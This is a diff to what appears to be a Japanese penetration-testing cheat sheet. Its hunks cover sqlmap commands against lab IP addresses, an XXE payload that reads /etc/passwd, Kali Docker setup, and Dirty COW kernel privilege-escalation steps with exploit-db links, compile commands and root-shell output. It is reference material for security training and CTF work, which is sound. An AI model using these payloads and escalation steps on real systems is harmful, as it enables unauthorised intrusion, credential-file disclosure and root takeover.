@@ -479,19 +479,19 @@ sqlmap -u http://192.168.56.1/vuln.php?id=1
 sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; Linux x86_64; rv：60.0 ）Gecko / 20100101 Firefox / 60.0 "
 ```
 
-### XXE(XML external entitiy)
+### XXE(XML External Entitiy)
 下のエクスプロイトでは、&xxe;と記述した箇所でfile:///etc/passwdを実行させている。
 ```
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE data [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-		<bugreport>
-		<title>test</title>
-		<cwe>test</cwe>
-		<cvss>test</cvss>
-		<reward>&xxe;</reward>
-		</bugreport>
+<bugreport>
+	<title>test</title>
+	<cwe>test</cwe>
+	<cvss>test</cvss>
+	<reward>&xxe;</reward>
+</bugreport>
 ```
 
 ### SSRF(サーバサイドリクエストフォージェリ)
@@ -1392,6 +1392,15 @@ Buildx:
 ```
 docker run --privileged --rm tonistiigi/binfmt --install all
 ```
+```
+docker pull kalilinux/kali-rolling:arm64
+docker pull kalilinux/kali-rolling:latest --platform linux/arm64
+```
+
+## x86用gccコンパイル
+```
+sudo apt install libc6-dev-i386
+```
 
 ## base64,16進数 → テキスト
 ```
@@ -1965,6 +1974,9 @@ linux-exploit-suggester2による自動列挙:
 https://github.com/jondonas/linux-exploit-suggester-2
 ### Dirtycow
 #### 40839.c(dirty.c)
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method):
+https://www.exploit-db.com/exploits/40839  
+
 パスワードを自身で入力して、firefaltというアカウントを作成する。
 ```
 gcc -pthread dirty.c -o dirty -lcrypt
@@ -1982,15 +1994,19 @@ firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
 su firefart
 ```
 
-#### 40616.c(cowroot.c)  
-実行するだけでrootになれる
+#### 40616.c(cowroot.c)
+Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method):
+https://www.exploit-db.com/exploits/40616  
+
+実行するだけでrootになれる。  
+またx86用にも特に作業必要なくコンパイル可能。
 ```
-gcc cowroot.c -o cowroot -pthread
+gcc 40616.c -o cowroot -pthread
 ```
 ```
-* $ ./cowroot
-* root@box:/root/cow# id
-* uid=0(root) gid=1000(foo) groups=1000(foo)
+./cowroot
+root@box:/root/cow# id
+uid=0(root) gid=1000(foo) groups=1000(foo)
 ```
 #### c0w  
 https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54
